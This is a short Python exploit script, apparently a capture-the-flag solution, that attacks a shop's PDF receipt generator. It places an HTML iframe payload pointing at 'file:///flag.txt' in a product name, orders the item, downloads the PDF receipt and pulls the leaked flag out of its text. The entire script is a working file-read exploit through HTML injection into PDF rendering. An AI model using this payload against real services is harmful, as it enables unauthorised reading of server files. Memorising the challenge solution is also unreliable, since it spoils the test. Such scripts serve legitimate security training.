import os

SITE_URL = os.environ["SERVICE_APP_HTTP_ENDPOINT"]

import requests
from PyPDF2 import PdfReader
from io import BytesIO

s = requests.Session()


def add_to_cart(id, name):
    s.post(f"{SITE_URL}/cart/add", data={"productId": id, "productName": name})
    print(f"Added {name} to cart.")


def order():
    res = s.post(
        f"{SITE_URL}/order",
        data={
            "name": "John Doe",
            "email": "john@doe.com",
            "address": "123 Main St",
        },
    )
    if res.status_code == 200:
        print("Order placed successfully.")

        order_id = res.text.split("/receipt/")[1].split('"')[0]
        print(f"Order ID: {order_id}")
        return order_id
    else:
        print("Failed to place order.")


def get_receipt(order_id):
    res = s.get(f"{SITE_URL}/receipt/{order_id}")
    if res.status_code == 200:
        print("Receipt retrieved successfully.")
        return res.content
    else:
        print("Failed to retrieve receipt.")


def extract_pdf_text(pdf_data):
    reader = PdfReader(BytesIO(pdf_data))
    text = ""
    for page in reader.pages:
        text += page.extract_text()
    return text


def main():
    add_to_cart(1, '<iframe src="file:///flag.txt"></iframe>')
    order_id = order()
    receipt = get_receipt(order_id)

    text = extract_pdf_text(receipt)
    flag = text.split("SCC{")[1].split("}")[0]
    print(f"Flag: SCC{{{flag}}}")


if __name__ == "__main__":
    main()
